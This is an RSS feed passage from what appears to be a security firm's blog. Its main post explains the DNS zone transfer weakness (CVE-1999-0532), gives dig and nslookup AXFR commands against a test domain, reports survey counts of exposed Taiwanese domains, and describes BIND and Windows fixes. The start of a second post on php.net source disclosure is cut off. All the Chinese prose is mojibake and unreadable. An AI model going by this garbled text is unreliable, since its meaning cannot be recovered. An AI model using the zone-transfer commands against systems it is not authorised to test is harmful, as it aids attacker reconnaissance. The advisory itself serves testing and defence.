&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;dig +nostats +nocomments +nocmd NS zonetransfer.me&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Name server Êü•Ë©¢ÁµêÊûúÔºö&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;zonetransfer.me.		IN	NS
zonetransfer.me.	7118	IN	NS	ns12.zoneedit.com.
zonetransfer.me.	7118	IN	NS	ns16.zoneedit.com.&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;ÂæûÁµêÊûúÂèØÂæóÁü•Êúâ ns12.zoneedit.com Êàñ ns16.zoneedit.com ÈÄôÂÖ©ÂÄã DNS serverÔºåÊé•ËëóÊàëÂÄëÂç≥ÂèØÊ∏¨Ë©¶ÊòØÂê¶ÂèØÂæûÂ§ñÈÉ®Á∂≤Ë∑ØÂ∞çÈÄôÂÖ©ÂÄã DNS server ÈÄ≤Ë°å zone transferÔºåÊ∏¨Ë©¶ÊñπÂºèÂ¶Ç‰∏ãÔºö&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;dig axfr zonetransfer.me @ns12.zoneedit.com&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Zone transfer Ê∏¨Ë©¶ÁµêÊûúÔºö&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140505/linux-zone-transfer-result.jpg&quot; title=&quot;‰ΩøÁî® dig Ê∏¨Ë©¶Á∂≤ÂüüÊòØÂê¶Â≠òÂú® zone transfer ÊºèÊ¥û&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140505/linux-zone-transfer-result.jpg&quot; alt=&quot;‰ΩøÁî® dig Ê∏¨Ë©¶Á∂≤ÂüüÊòØÂê¶Â≠òÂú® zone transfer ÊºèÊ¥û&quot; title=&quot;‰ΩøÁî® dig Ê∏¨Ë©¶Á∂≤ÂüüÊòØÂê¶Â≠òÂú® zone transfer ÊºèÊ¥û&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Âæû‰∏äÈù¢ÁöÑÊ∏¨Ë©¶ÁµêÊûú‰∏≠ÊàëÂÄëÂèØÁôºÁèæÔºåzonetransfer.me ÈÄôÂÄãÁ∂≤ÂüüÁöÑÊâÄÊúâ DNS Ë®≠ÂÆöÂ∑≤ÂÖ®ÈÉ®Ë¢´ÂàóÂá∫„ÄÇ&lt;/p&gt;

&lt;h4 id=&quot;windows&quot;&gt;Windows&lt;/h4&gt;

&lt;p&gt;Ëã•ÊòØÂú® Windows Áí∞Â¢ÉÔºåÂèØÂú®ÂëΩ‰ª§ÊèêÁ§∫Â≠óÂÖÉÁí∞Â¢ÉÂÖß‰ΩøÁî® &lt;a href=&quot;http://support.microsoft.com/kb/200525/zh-tw&quot;&gt;nslookup&lt;/a&gt; Êåá‰ª§Êü•Ë©¢ÁõÆÊ®ô domain ‰ΩøÁî®Âì™‰∫õ name serverÔºö&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;nslookup &lt;span class=&quot;nt&quot;&gt;-type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;ns zonetransfer.me&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Name server Êü•Ë©¢ÁµêÊûúÔºö&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;Server:		8.8.8.8
Address:	8.8.8.8#53

Non-authoritative answer:
zonetransfer.me	nameserver &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; ns12.zoneedit.com.
zonetransfer.me	nameserver &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; ns16.zoneedit.com.

Authoritative answers can be found from:&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Ëº∏ÂÖ•Êåá‰ª§ÂæåÊàëÂÄëÂ¶ÇÂêåÂÖàÂâç‰ΩøÁî® dig ‰∏ÄÊ®£ÔºåÂæóÁü•ÁõÆÊ®ôÊúâ ns12.zoneedit.com Ëàá ns16.zoneedit.com ÈÄôÂÖ©ÂÄã name serverÔºåÊé•ËëóÂÜçÂ¶Ç‰∏ãÂúñ‰æùÂ∫èËº∏ÂÖ•‰∏âÈÅìÊåá‰ª§Êü•Ë©¢Ôºö&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;nslookup

server ns12.zoneedit.com

&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; zonetransfer.me&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;blockquote&gt;
  &lt;p&gt;Ë®ªÔºöLinux ÁâàÁöÑ nslookup Ê≤íÊúâÂØ¶‰Ωú ls ÈÄôÂÄãÂäüËÉΩÂñîÔºÅ&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Zone transfer Ê∏¨Ë©¶ÁµêÊûúÔºö&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140505/windows-zone-transfer-result.jpg&quot; title=&quot;‰ΩøÁî® nslookup Ê∏¨Ë©¶Á∂≤ÂüüÊòØÂê¶Â≠òÂú® zone transfer ÊºèÊ¥û&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140505/windows-zone-transfer-result.jpg&quot; alt=&quot;‰ΩøÁî® nslookup Ê∏¨Ë©¶Á∂≤ÂüüÊòØÂê¶Â≠òÂú® zone transfer ÊºèÊ¥û&quot; title=&quot;‰ΩøÁî® nslookup Ê∏¨Ë©¶Á∂≤ÂüüÊòØÂê¶Â≠òÂú® zone transfer ÊºèÊ¥û&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Ê∏¨Ë©¶ÁµêÊûúËàá Linux Áí∞Â¢ÉÊâÄÂæóÂà∞ÁöÑË≥áÊñôÈõ∑ÂêåÔºåÂèØÊàêÂäüÂàóÂá∫Ë©≤Á∂≤ÂüüÁöÑÊâÄÊúâ DNS Ë®≠ÂÆö„ÄÇ&lt;/p&gt;

&lt;h4 id=&quot;online-service&quot;&gt;Online Service&lt;/h4&gt;

&lt;p&gt;Áï∂ÁÑ∂Ôºå‰∏¶‰∏çÊòØÊØèÂÄã‰∫∫ÈÉΩÁÜüÊÇâ‰∏äËø∞Êåá‰ª§ÁöÑÊìç‰ΩúÊñπÂºèÔºåÂõ†Ê≠§Èô§‰∫Ü‰ªãÁ¥πÊâãÂãïÊ™¢Ê∏¨ÊñπÊ≥ï‰πãÂ§ñÔºåÂú®ÈÄôË£°‰πüÊèê‰æõÂπæÂÄãÁ∑ö‰∏äÊ™¢Ê∏¨ÁöÑÊúçÂãôÔºåËÆìÂ§ßÂÆ∂ÂèØ‰ª•ËøÖÈÄüÊ™¢Ê∏¨Ëá™ÂÆ∂ÂÖ¨Âè∏ÊàñËÄÖ‰Ω†Ê≠£Âú®‰ΩøÁî®ÁöÑÊúçÂãôÊòØÂê¶ÊúâÊ≠§ÂïèÈ°åÔºö&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.ultratools.com/tools/zoneFileDump&quot;&gt;UltraTools&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://hackertarget.com/zone-transfer/&quot;&gt;HackerTarget&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://tools.digitalpoint.com/zone-transfer&quot;&gt;Digital Point&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;ÂØ¶ÈöõÊ°à‰æã&quot;&gt;ÂØ¶ÈöõÊ°à‰æã&lt;/h3&gt;

&lt;p&gt;Â¶ÇÂêå‰∏äÊ¨° &lt;a href=&quot;http://devco.re/blog/2014/03/10/security-issues-of-http-headers-1/&quot;&gt;HTTP Headers Ë≥áÂÆâË≠∞È°å&lt;/a&gt;ÊâÄÊé¢Ë®éÁöÑÂ∞çË±°ÔºåÊàëÂÄëÂæû TIEA ÊàêÂì°‰ª•Âèä Alexa TW top 525 ËßÄÂØü zone transfer ÂïèÈ°åÂàÜÂà•Âú®ÈÄô‰∫õÊóèÁæ§‰∏≠‰ΩîÊúâÂ§öÂ∞ëÊØî‰æã„ÄÇ&lt;/p&gt;

&lt;p&gt;Ê†πÊìöÊàëÂÄëÁõ£Ê∏¨ÁöÑÁµêÊûúÔºåÂú®ÁõÆÂâç TIEA ÁöÑ 132 ÂêçÊàêÂì°‰∏≠ÔºåÊúâ 20 ÂÄãÁ∂≤ÂüüÂ≠òÂú® zone transfer ÂïèÈ°åÔºå‰Ωî‰∫Ü 15.15%„ÄÇËÄåÂú® Alexa TW top 525 Áï∂‰∏≠ÔºåÊúâ 48 ÂÄãÁ∂≤ÂüüÂ≠òÂú® zone transfer ÂïèÈ°åÔºå‰Ωî‰∫Ü 9.14%„ÄÇ‰πçÁúã‰πã‰∏ãÊØîÁéá‰ºº‰πé‰∏çÈ´òÔºå‰ΩÜÊòØÂú®‰∏äËø∞ÂÖ©ÂÄãÊóèÁæ§ÁöÑÁ∂≤ÂüüÁï∂‰∏≠ÔºåÂåÖÊã¨Ôºö&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Èõª‰ø°ÂïÜ&lt;/li&gt;
  &lt;li&gt;Â§öÂÆ∂ÈõªË¶ñÂ™íÈ´î&lt;/li&gt;
  &lt;li&gt;Â§öÂÆ∂Á∂≤Ë∑ØÊñ∞ËÅûÂ™íÈ´î&lt;/li&gt;
  &lt;li&gt;Â§öÂÆ∂Á∑ö‰∏äË≥ºÁâ©Á∂≤Á´ô&lt;/li&gt;
  &lt;li&gt;Áü•ÂêçÂúòË≥ºÁ∂≤Á´ô&lt;/li&gt;
  &lt;li&gt;Áü•ÂêçÈáëÊµÅÂÖ¨Âè∏&lt;/li&gt;
  &lt;li&gt;Áü•ÂêçÁ∑ö‰∏äÈü≥Ê®ÇÊúçÂãô&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Âè∞ÁÅ£‰ºÅÊ•≠‰∏çÂ§†Ê≥®ÈáçË≥áË®äÂÆâÂÖ®ÔºåÁΩîÈ°ßÂÆ¢Êà∂Ë≥áÊñôÂÆâÂÖ®ÊÄßÔºåÊó©Â∑≤‰∏çÊòØÊñ∞ËÅû„ÄÇÁÑ∂ËÄåËã•‰ºÅÊ•≠‰∏çÈ°ßËá™Ë∫´ÂïÜÊ•≠Âà©ÁõäËàáË≤¨‰ªªÔºåÁï∂ÂΩºÊ≠§ÁÑ°ÂïÜÊ•≠ÂæÄ‰æÜÊôÇÔºåÊàëÂÄë‰πüÁÑ°Ê≥ï‰∏Ä‰∏ÄÂíéË≤¨„ÄÇ‰ΩÜËã•ÈÄ£Âè∞ÂåóÂ∏ÇÊîøÂ∫ú„ÄÅÊïôËÇ≤ÈÉ®„ÄÅÂ§öÈñìÂ§ßÂ∞àÈô¢Ê†°ÈÉΩÊúâÊ≠§ÂïèÈ°åÔºåÂ∞±‰ª§‰∫∫‰∏çÂ§™ËÉΩÊé•Âèó‰∫ÜÔºåÈÄô‰∫õÊîøÂ∫úÂñÆ‰ΩçËàáÊïôËÇ≤Ê©üÊßãÁêÜÁï∂ÁÇ∫ÊàëÂÄëÁöÑÂÄã‰∫∫Ë≥áÊñôÂÆâÂÖ®ÊÄßË≤†Ëµ∑ÂÖ®ÈÉ®ÁöÑË≤¨‰ªªÔºå‰∏çÊáâË©≤ÊºèÊéâ‰ªª‰Ωï‰∏ÄÂÄãË≥áÂÆâÁí∞ÁØÄ„ÄÇ‰∏äËø∞ÁµêÊûúÈ°ØÁ§∫Âá∫Âè∞ÁÅ£ÂæûÊîøÂ∫úÂà∞‰ºÅÊ•≠ÂèØËÉΩÈÉΩÊ≤íÊúâÂæπÂ∫ïËêΩÂØ¶ DNS ÁöÑË≥áÂÆâË®≠ÂÆöÔºåËÄå‰∏îÁõÆÂâçÁöÑÊï∏ÊìöÂÉÖÂÉÖÊòØÈáùÂ∞ç TIEA ÊàêÂì°‰ª•Âèä Alexa TW top 525 ÈÄ≤Ë°åÊ™¢Ê∏¨ÔºåËã•ÊòØÂ∞çÂÖ®Âè∞ÁÅ£ÊàñÊòØÂÖ®‰∏ñÁïåÈÄ≤Ë°åÂ§ßÁØÑÂúçÁöÑÊ™¢Ê∏¨ÔºåÊÅêÊÄïÊúÉÁôºÁèæÊõ¥Â§öÈ©ö‰∫∫ÁöÑÊ°à‰æãÔºÅ&lt;/p&gt;

&lt;h3 id=&quot;Â∞ç‰ºÅÊ•≠ÁöÑÊΩõÂú®ÂΩ±Èüø&quot;&gt;Â∞ç‰ºÅÊ•≠ÁöÑÊΩõÂú®ÂΩ±Èüø&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;Ê¥©ÊºèÁ∂≤ÂüüÂêçÁ®±&lt;/p&gt;

    &lt;p&gt;‰∏ÄËà¨‰ºÅÊ•≠Âú®ÈÄ≤Ë°å&lt;a href=&quot;http://devco.re/services/penetration-test&quot;&gt;Êª≤ÈÄèÊ∏¨Ë©¶&lt;/a&gt;ÊôÇÔºåÈÄöÂ∏∏Âè™ÊúÉÊåëÂπæÂÄãÊúÄÈáçË¶Å„ÄÅÊúÄÂ∏∏Èù¢Â∞çÂÆ¢Êà∂ÁöÑÁ∂≤ÂüüÈÄ≤Ë°åÊ∏¨Ë©¶Ôºå‰ΩÜÊòØÂÖ•‰æµËÄÖÂèØ‰∏çÊúÉÈÄôÈ∫º‰πñ„ÄÇÁï∂Êúâ‰∫∫ÂòóË©¶Ë¶ÅÂÖ•‰æµ‰ºÅÊ•≠ÊôÇÔºåÂøÖÂÆöÊòØÂÖàÈÄ≤Ë°åÂÖ®Èù¢ÁöÑÂÅµÊü•ÔºåËßÄÂØü‰ºÅÊ•≠Âì™ÂπæÂÄãÁ∂≤ÂüüÊâÄÂü∑Ë°åÁöÑ service ÊúâÊΩõÂú®ÁöÑÂº±ÈªûÔºåÊàñÊòØÁúãÂì™ÂπæÂÄãÁ∂≤ÂüüÈò≤Á¶¶ÂäõÈÅìËºÉÂº±ÔºåÂÜçÂæûË©≤Ëôï‰∏ãÊâã„ÄÇÂõ†Ê≠§ zone transfer ÂïèÈ°åÊâÄÊèê‰æõÁöÑÂÆåÊï¥ DNS Ë®òÈåÑÔºåÂ∞±ÁÇ∫ÂÖ•‰æµËÄÖÁúÅ‰∏ã‰∫ÜË®±Â§öÂÅµÊü•ÁöÑÂ∑•Â§´„ÄÇ&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Ê¥©ÊºèÂ§ñÁ∂≤ IP ÁØÑÂúç&lt;/p&gt;

    &lt;p&gt;Áï∂ÊîªÊìäËÄÖÂèñÂæó zone transfer ÊâÄÊ¥©ÊºèÁöÑË≥áÊñôÂæåÔºåÂèØÂêàÁêÜÊé®Êñ∑Âì™‰∫õÁ∂≤ÊÆµÊòØÂ±¨ÊñºË©≤‰ºÅÊ•≠ÔºåÈÄ≤‰∏ÄÊ≠•Â∞çË©≤Á∂≤ÊÆµÈÄ≤Ë°åÊéÉÊèèÔºåÂòóË©¶ÊâæÂ∞ãÊúâÊ©üÊúÉÂÖ•‰æµ‰πãÊ®ôÁöÑÁâ©„ÄÇ&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Ê¥©ÊºèÂÖßÁ∂≤ IP ÁØÑÂúç&lt;/p&gt;

    &lt;p&gt;Êúâ‰∫õÁÆ°ÁêÜ‰∫∫Âì°„ÄÅÈñãÁôºËÄÖÁÇ∫Ê±ÇÂÖßÈÉ®ÈñãÁôºÊñπ‰æøÔºåÁ∂ìÂ∏∏ÊúÉÂ∞áÁ∂≤ÂüüÂêçÁ®±Ë∑üÂÖßÁ∂≤ IP ‰ΩçÂùÄÁ∂ÅÂú®‰∏ÄËµ∑Ôºå‰æãÂ¶ÇÂ∞á phpmyadmin.example.com Ë®≠ÂÆöÁÇ∫ 192.168.1.100ÔºåÊîªÊìäËÄÖÂ∞±ÂèØÊ†πÊìöÊ≠§È°ûË≥áË®äÁåúÊ∏¨ÂÖßÁ∂≤Âì™‰∫õÁ∂≤ÊÆµÂ≠òÂú®ÈáçË¶ÅÊúçÂãô„ÄÇÈÄôÁ®ÆË®≠ÂÆöÂπ≥Â∏∏‰πüË®±‰∏çÊúÉÈÄ†ÊàêÈáçÂ§ßÊêçÂÆ≥Ôºå‰ΩÜÊòØÁï∂ÁÆ°ÁêÜËÄÖÁñèÊñºÂª∫Á´ãÂÖßÁ∂≤Èò≤Á¶¶Ê©üÂà∂ÔºåÊÅ∞Â•Ω‰ºÅÊ•≠ÂèàË¢´ÂÖ•‰æµËá≥ÂÖßÁ∂≤ÊôÇÔºåÈÄ†Êàê‰∏ÄÈÄ£‰∏≤ÈáçÂ§ßÊêçÂ§±ÁöÑÊ©üÁéáÂ∞áÊúÉÂ§ßÂπÖÊèêÈ´ò„ÄÇ&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;Ëß£Ê±∫ÊñπÂºè&quot;&gt;Ëß£Ê±∫ÊñπÂºè&lt;/h3&gt;

&lt;h4 id=&quot;linux-1&quot;&gt;Linux&lt;/h4&gt;

&lt;p&gt;Ëã•‰ΩøÁî® LinuxÔºåÂèØÂú® /etc/named.conf ÂÖßÂä†ÂÖ•‰∏ãÂàóÈÅ∏È†ÖÔºå‰ª•ÈôêÂà∂ÂèØÂ≠òÂèñ zone transfer ÁöÑ‰æÜÊ∫êÔºö&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;options &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
    allow-transfer &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
        1.2.3.4&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        5.6.7.8&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Ë®≠ÂÆöÂÆåÁï¢ÂæåÔºåÂ∞á DNS ÊúçÂãôÈáçÂïüÂç≥ÂèØÁîüÊïà„ÄÇ&lt;/p&gt;

&lt;h4 id=&quot;windows-1&quot;&gt;Windows&lt;/h4&gt;

&lt;p&gt;Âú® Windows server Áï∂‰∏≠ÔºåÊàëÂÄëÂèØÂà∞‰º∫ÊúçÂô®ÁÆ°ÁêÜÂì°‰øÆÊîπÁ∂≤ÂüüÁöÑÁõ∏ÈóúË®≠ÂÆöÔºåÂ¶Ç‰∏ãÂúñÔºö&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140505/windows-zone-transfer-solution-1.png&quot; title=&quot;Êñº‰º∫ÊúçÂô®ÁÆ°ÁêÜÂì°‰øÆÊîπÁ∂≤ÂüüÁöÑ zone transfer Ë®≠ÂÆö&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140505/windows-zone-transfer-solution-1.png&quot; alt=&quot;Êñº‰º∫ÊúçÂô®ÁÆ°ÁêÜÂì°‰øÆÊîπÁ∂≤ÂüüÁöÑ zone transfer Ë®≠ÂÆö&quot; title=&quot;Êñº‰º∫ÊúçÂô®ÁÆ°ÁêÜÂì°‰øÆÊîπÁ∂≤ÂüüÁöÑ zone transfer Ë®≠ÂÆö&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Âú®‰º∫ÊúçÂô®ÁÆ°ÁêÜÂì°‰∏≠ÔºåÈÅ∏ÂÆöÊÉ≥Ë¶Å‰øÆÊîπÁöÑÁ∂≤ÂüüÔºàÊ≠§Ëôï‰ª• test.com ÁÇ∫‰æãÔºâÔºåÊåâÂè≥ÈçµÈªûÈÅ∏ÂÖßÂÆπÔºåÂ∞áÊúÉË∑≥Âá∫ÈÅ∏ÂñÆÂ¶Ç‰∏ãÂúñÔºö&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140505/windows-zone-transfer-solution-2.png&quot; title=&quot;‰øÆÊîπ test.com ÁöÑ zone transfer Ë®≠ÂÆö&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140505/windows-zone-transfer-solution-2.png&quot; alt=&quot;‰øÆÊîπ test.com ÁöÑ zone transfer Ë®≠ÂÆö&quot; title=&quot;‰øÆÊîπ test.com ÁöÑ zone transfer Ë®≠ÂÆö&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Êé•ËëóÂ∞±ÊòØËßÄÁúã„ÄåÂÖÅË®±ÂçÄÂüüËΩâÈÄÅ„ÄçÈÅ∏È†ÖÊòØÂê¶ÊúâÂãæÈÅ∏ÔºåËã•Â∑≤ÂãæÈÅ∏ÔºåÂâáÁ¢∫Ë™çËΩâÈÄÅÂ∞çË±°ÊòØÂê¶ÁÇ∫‰∏ãÂàóÂÖ©Á®ÆÔºö&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Âè™Âà∞ÂàóÂú®„ÄåÂêçÁ®±‰º∫ÊúçÂô®Á¥¢„ÄçÂºïÊ®ôÁ∞Ω‰∏äÁöÑ‰º∫ÊúçÂô®&lt;/li&gt;
  &lt;li&gt;Âè™Âà∞‰∏ãÂàó‰º∫ÊúçÂô®&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;tcp-53-port&quot;&gt;TCP 53 port&lt;/h4&gt;

&lt;p&gt;DNS Âú®ÂÅö zone transfer ÊôÇÊòØ‰ΩøÁî® TCP 53 portÔºàÊúâÂà•Êñº‰∏ÄËà¨ DNS query ÁöÑ UDP 53 portÔºâÔºåÂõ†Ê≠§Êúâ‰∫õ‰∫∫ÊúÉË™çÁÇ∫Â∞á TCP 53 port ÈóúÈñâÂ∞±ÂèØ‰ª•Â∞ç‰ªò zone transferÔºåËÄå‰∏çÊÉ≥‰øÆÊîπ zone transfer ÁöÑË®≠ÂÆö„ÄÇÂÖ∂ÂØ¶ÈÄôÂÄãËßÄÂøµÂè™Â∞ç‰∫Ü‰∏ÄÂçäÔºåËã• zone file ÁöÑË≥áÊñôÂ∞èÊñº 512 byteÔºå‰ªçÁÑ∂ÂèØ‰ª•ÈÄèÈÅé UDP ÂÇ≥Ëº∏„ÄÇÂç≥‰Ωø zone file ÁöÑË≥áÊñôÂ§ßÊñº 512 byteÔºå&lt;a href=&quot;http://securityweekly.com/2011/11/incremental-zone-transfers-for.html&quot;&gt;‰πüÂèØ‰ª•Áî® Incremental Zone Transfer (IXFR) ÁöÑÊñπÂºèÂèñÂæóÈÉ®ÂàÜË≥áÊñô&lt;/a&gt;„ÄÇ&lt;/p&gt;

&lt;h3 id=&quot;ÁµêË´ñ&quot;&gt;ÁµêË´ñ&lt;/h3&gt;

&lt;p&gt;Â¶ÇÊûú‰ºÅÊ•≠‰ªäÂ§©ÈùûÂ∏∏ÊúâËá™‰ø°ËÉΩÂ§†ÊõøÊâÄÊúâÁ∂≤ÂüüÈÉΩÊ∫ñÂÇôÂ•ΩÂÆåÂñÑÁöÑÂÆâÂÖ®Êé™ÊñΩÔºåÈÇ£È∫º zone transfer ÊâÄÊ¥©ÊºèÁöÑË≥áÊñôÂ∞çË©≤‰ºÅÊ•≠Â∞±‰∏çÊúÉÊúâÂ§™Âö¥ÈáçÁöÑÂΩ±Èüø„ÄÇÁÑ∂ËÄåÔºåÂú®Áèæ‰ªäÈÄôÂÄãÂÖ•‰æµÊâãÊ≥ïÊó•Êñ∞ÊúàÁï∞ÁöÑ‰∏ñÁïåË£°ÔºåÂèàÊúâË™∞ËÉΩÂ§†Ê∞∏ÈÅ†‰øùË≠âËá™Â∑±ÁöÑÂÆâÂÖ®Èò≤Ë≠∑Â∑≤Á∂ìÂÅöË∂≥‰∫ÜÂë¢ÔºüÂú®ÂâçÈô£Â≠êÁÅ´Á¥ÖÁöÑ &lt;a href=&quot;http://devco.re/blog/2014/04/11/openssl-heartbleed-how-to-hack-how-to-protect/&quot;&gt;OpenSSL CVE-2014-0160 Heartbleed&lt;/a&gt; ÂïèÈ°åË¢´ÁàÜÂá∫‰æÜ‰πãÂæåÔºåÊàëÂÄëÂ∞±ËóâÁî±Ë®±Â§ö zone transfer ÁöÑË®òÈåÑËßÄÂØüÂà∞ÂÖ®‰∏ñÁïåÊúâÈùûÂ∏∏Â§ö‰ºÅÊ•≠Âè™‰øÆÂæ©‰∫Ü‰∏ªË¶ÅÁ∂≤Á´ôÁöÑ OpenSSL ÊºèÊ¥ûÔºåÂçªÂøΩÁï•‰∫Ü‰ºÅÊ•≠ÂÖßÂÖ∂‰ªñÁöÑÊúçÂãôËàáË®≠ÂÇôÂèØËÉΩ‰πüÊúâÊ≠§ÊºèÊ¥ûÔºåÂÉèÊòØ DB„ÄÅEmail„ÄÅVPN„ÄÅNAS Á≠âÁ≠âÔºåÁõ¥Âà∞‰ªäÊó•‰ªçÈÅ≤ÈÅ≤Êú™‰øÆÂæ©„ÄÇ&lt;/p&gt;

&lt;p&gt;ÂçÉËê¨Âà•‰ª•ÁÇ∫‰Ω†ÊâÄË≥ºË≤∑ÁöÑÂêÑÁ®ÆË≥áÂÆâË®≠ÂÇôËÉΩÈò≤Á¶¶ÊâÄÊúâË≥áÂÆâÂº±ÈªûÔºå‰πüÂà•ÂøΩÁï•‰∫ÜÂêÑÈ†ÖÂè§ËÄÅÁöÑË≥áÂÆâÂº±ÈªûÔºåÊõ¥Âà•Â∞èÁúã‰∫Ü‰Ω†ÊâÄ‰∏çÁÜüÊÇâÁöÑÈß≠ÂÆ¢ÂÄëÁöÑÁµÑÂêàÂêÑÂºèÂêÑÊ®£Âº±ÈªûÁöÑËÉΩÂäõÔºåÂè™Ë¶ÅÊúâ‰∏ÄÂÄãË≥áÂÆâÁí∞ÁØÄÁñèÊºèÔºåÈö®ÊôÇÈÉΩÊúâÂèØËÉΩÂ∞ç‰ºÅÊ•≠ÈÄ†ÊàêËá¥ÂëΩÂç±Ê©ü„ÄÇ&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2014/05/05/zone-transfer-CVE-1999-0532-an-old-dns-security-issue/</link>
                <guid>https://devco.re/blog/2014/05/05/zone-transfer-CVE-1999-0532-an-old-dns-security-issue</guid>
                <pubDate>Mon, 05 May 2014 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>PHP ÂÆòÁ∂≤ÂéüÂßãÁ¢ºËÆÄÂèñÊ°à‰æã</title>
                <description>&lt;p&gt;&lt;a href=&quot;https://www.owasp.org/index.php/Top_10_2013-A4-Insecure_Direct_Object_References&quot;&gt;‰∏çÂÆâÂÖ®ÁöÑÂºïÁî®Áâ©‰ª∂ (Insecure Direct Object Reference)&lt;/a&gt; ÊòØÂÄãÈùûÂ∏∏Â∏∏Ë¶ãÁöÑË≥áÂÆâÊºèÊ¥ûÔºåÂú® &lt;a href=&quot;https://www.owasp.org/&quot;&gt;OWASP&lt;/a&gt; ÂÖ¨Â∏ÉÁöÑ&lt;a href=&quot;https://www.owasp.org/index.php/Top_10_2013-Top_10&quot;&gt;ÂçÅÂ§ßÁ∂≤Á´ôÊáâÁî®Á®ãÂºèÂÆâÂÖ®ÊºèÊ¥û&lt;/a&gt; ‰∏≠È´òÂ±ÖÁ¨¨ÂõõÂêç„ÄÇÈÄöÂ∏∏ÁôºÁîüÂú®Á∂≤Á´ôÊáâÁî®Á®ãÂºè‰∏äÊ≤íÊúâÈáùÂ∞çËº∏ÂÖ•ÁöÑÂèÉÊï∏ÂÅöÂ•ΩÊ™¢Êü•ÔºåÂ∞±ÊääÂèÉÊï∏‰∏üÂÖ• include Êàñ readfile Á≠âÂáΩÊï∏Áï∂‰∏≠ÂºïÁî®Ôºå‰ΩøÂæóÊîªÊìäËÄÖÂèØ‰ª•ËóâÊ≠§Â≠òÂèñ‰ªªÊÑèÊñá‰ª∂ÁöÑÂéüÂßãÁ¢º„ÄÇ&lt;/p&gt;

&lt;p&gt;‰ªäÂ§©ÈÄôÂÄãÊ°à‰æãÂ∞±ÁôºÁîüÂú® PHP ÁöÑÂÆòÊñπÁ∂≤Á´ô (&lt;a href=&quot;http://www.php.net/&quot;&gt;http://www.php.net/&lt;/a&gt;)ÔºåÊ∂àÊÅØ‰æÜÊ∫êÊòØÁü•ÂêçÁöÑ 0-Day ÈªëÂ∏Ç 1337dayÔºåÁôº‰ΩàÁöÑÊó•ÊúüÊòØ 2014/4/4 ÔºåÂéüÂßãÁöÑÂÖßÂÆπÊòØÈÄôÊ®£ÁöÑÔºö&lt;/p&gt;

&lt;!-- more --&gt;

